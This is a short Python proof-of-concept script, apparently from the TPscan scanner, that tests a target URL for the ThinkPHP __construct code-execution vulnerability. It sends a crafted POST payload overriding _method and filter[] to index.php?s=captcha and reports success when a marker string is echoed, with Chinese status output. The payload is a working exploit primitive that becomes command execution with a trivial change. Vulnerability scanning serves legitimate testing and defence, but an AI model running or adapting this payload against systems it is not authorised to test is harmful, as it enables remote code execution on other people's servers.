#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
from termcolor import colored

urllib3.disable_warnings()


def thinkphp_construct_code_exec_verify(url):
    """thinkphp_construct_code_exec_verify"""
    pocdict = {
        "vulnname": "thinkphp_construct_code_exec",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": "TPscan",
    }
    payload = {
        '_method': '__construct',
        'filter[]': 'var_dump',
        'method': 'get',
        'server[REQUEST_METHOD]': 'f7e0b956540676a129760a3eae309294',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=captcha')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"string(32)" and r"56540676a129760a3ea" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = '56540676a129760a3ea'
            pocdict['response'] = req.status_code
            print(colored("[+] 目标存在 thinkphp_construct_code_exec 漏洞\tpayload: ", "green"))
            print(colored(pocdict, 'green'))
        else:
            print(colored("\n[*] 目标不存在 thinkphp_construct_code_exec 漏洞", "red"))
    except:
        pass
